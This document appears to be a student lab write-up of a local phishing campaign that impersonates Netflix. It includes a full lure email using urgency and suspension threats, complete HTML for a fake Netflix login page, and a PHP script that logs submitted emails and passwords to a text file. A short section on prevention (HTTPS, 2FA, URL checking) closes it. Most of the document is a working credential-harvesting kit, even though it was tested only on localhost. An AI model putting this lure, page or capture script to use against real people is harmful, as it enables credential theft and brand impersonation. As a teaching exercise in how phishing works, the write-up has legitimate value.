#PHISHING CAMPAIGN PROJECT


##1. Project Overview

	The objective of this project was to create a phishing campaign that mimics the Netflix login page in order to capture user credentials (email and password). 


	The project involved:

	⁃	Building a fake login page using HTML.

	⁃	Processing the credentials with a PHP script.

	⁃	Logging the captured credentials in a text file.
	
	⁃	Hosting the local environment using MAMP PRO.

	
	At the end, I’ll also include methods to prevent such phishing attacks.



##2. Setting Up the Environment

	To host the phishing website, we needed to create a local environment using MAMP PRO. Here’s what was done:


	2.1. Installed MAMP PRO:

	⁃	This provided us with the Apache server and a local PHP environment.

	⁃	We configured MAMP PRO and set the Document Root to: /Users/mac/Sites/localhost, which is where all the files (HTML and PHP) were placed.

	
	2.2. Challenges Faced:

	⁃	Initially, we encountered an issue where MAMP wouldn’t start, showing an Apache error. This was fixed by adjusting the port settings and granting proper read/write permissions to the root folder.


	2.3. How It Was Overcome:

	⁃	The port settings were changed to ensure there were no conflicts, and file permissions for the root directory were set to allow both read and write access.



##3. Crafting the Fake Phishing Email 

	For the phishing campaign, a fake email was crafted to trick users into visiting the fake Netflix login page. The email was designed to look legitimate, using urgency and scare tactics to prompt users to click on the link.

	
	3.1. Fake Email Example:


		Subject: Urgent: Action Required to Confirm Your Netflix Account!

		Body:
			
			Dear [Victim's Name],

			We’ve noticed some unusual activity on your Netflix account, and for your security, we’ve temporarily disabled it. To avoid any disruptions in your service, we kindly ask you to confirm your account details immediately.

			Please confirm your account by clicking the link below:

			[Confirm Your Account Here](http://localhost:8888/fake_netflix_login.html)

			Failure to do so within the next 24 hours may result in a permanent suspension of your account.

			Thank you for your immediate attention to this matter.

			Best regards,  
			Netflix Security Team   
			support@netflix.com


	3.2. Details:

	⁃	The URL provided in the email (http://localhost:8888/fake_netflix_login.html) directs users to the fake login page, where credentials are captured.

	⁃	The email uses a sense of urgency (claiming account suspension) to compel users to act quickly.




##4. Building The Phishing Website (HTML & PHP)


	​4.1. HTML Script for the Fake Netflix Login Page:

	⁃	The fake login page was designed to look like the official Netflix login page. Here’s the HTML code used:


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            text-align: center;
            padding: 50px;
        }
        .login-box {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            width: 300px;
            margin: 0 auto;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 4px;
            border: 1px solid #ccc;
        }
        button {
            padding: 10px 20px;
            background-color: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h2>Sign in to your Netflix account</h2>
    <div class="login-box">
        <form action="submit_phishing_form.php" method="post">
            <input type="text" name="username" placeholder="Email or phone number">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>



	4.2. PHP Script for Capturing Credentials:

	⁃	This PHP script handles the form submission and captures the username and password, saving them in a text file.

<?php
// Simulate capturing form data
$username = $_POST['username'];
$password = $_POST['password'];

// Log the captured credentials into a text file
$log = "Captured Username: $username | Captured Password: $password\n";
file_put_contents('phishing_log.txt', $log, FILE_APPEND | LOCK_EX);

echo "Credentials captured!";
?>

	⁃	Location: Both the HTML and PHP files were placed in the /Users/mac/Sites/localhost directory.

	⁃	Outcome: When the form is submitted, the credentials are saved in phishing_log.txt.



##5. Testing The Phishing Campaign

	After building the fake phishing website and PHP script, the next step was to test the campaign by simulating a user interaction.


	5.1. Process:

	⁃	Accessing the Fake Website: The website was hosted locally at the following URL:

			http://localhost:8888/fake_netflix_login.html

	⁃	When this URL was visited, the fake Netflix login page appeared, prompting the user to enter their credentials.


	5.2. Submitting Credentials:

	⁃	Test credentials were entered (e.g., Username: testuser@test.com, Password: testpassword).

	⁃	Upon clicking Sign In, the credentials were submitted to the submit_phishing_form.php script.
	

	5.3. Capturing the Credentials:

	⁃	The PHP script logged the credentials in a text file named phishing_log.txt, located in the directory:

			/Users/mac/Sites/localhost

	5.4. Verification:

	⁃	The phishing_log.txt file successfully captured and stored the credentials:
		
			Captured Username: testuser@test.com | Captured Password: testpassword



##6. Phishing Attack Prevention

	
	In addition to building and testing the phishing campaign, it’s important to understand how to prevent phishing attacks. 


	Below are some key techniques used by legitimate websites and organizations to protect users:


		1. Using HTTPS:

		⁃	What is it?: HTTPS (Hypertext Transfer Protocol Secure) encrypts data between the user’s browser and the server, ensuring that any information sent (like login credentials) is secure.

		⁃	Why it matters: Attackers often use fake websites that do not have HTTPS. Users should always check for the lock icon and https:// in the URL before entering sensitive information.


		2. Adding Two-Factor Authentication (2FA):

		⁃	What is it?: 2FA adds an additional security layer by requiring users to provide two pieces of evidence to log in (e.g., password + a one-time code sent to their phone).

		⁃	Why it matters: Even if attackers steal a user’s password, they cannot access the account without the second authentication factor.


		3. Educating Users to Verify URLs:

		⁃	What it means: Educating users to carefully check URLs before entering any personal information helps prevent phishing. Attackers often use fake URLs that look similar to legitimate ones but with slight differences.

		⁃	Why it matters: Users should be trained to look for inconsistencies in URLs, email senders, and other signs that a website or message may be fraudulent.



	Challenges Faced and Overcoming Them:


	Throughout the project, a few challenges were encountered:

	⁃	MAMP Not Starting: Fixed by adjusting the Apache port to 8888 and ensuring no other services were conflicting.

	⁃	Permissions Issues: Resolved by setting read and write permissions for the local directory, allowing the PHP script to log credentials successfully.

	⁃	Fake Email Crafting: The fake email was crafted to appear legitimate, using urgency and scare tactics. The link in the email was set to direct the user to the local phishing page.







##THE END.


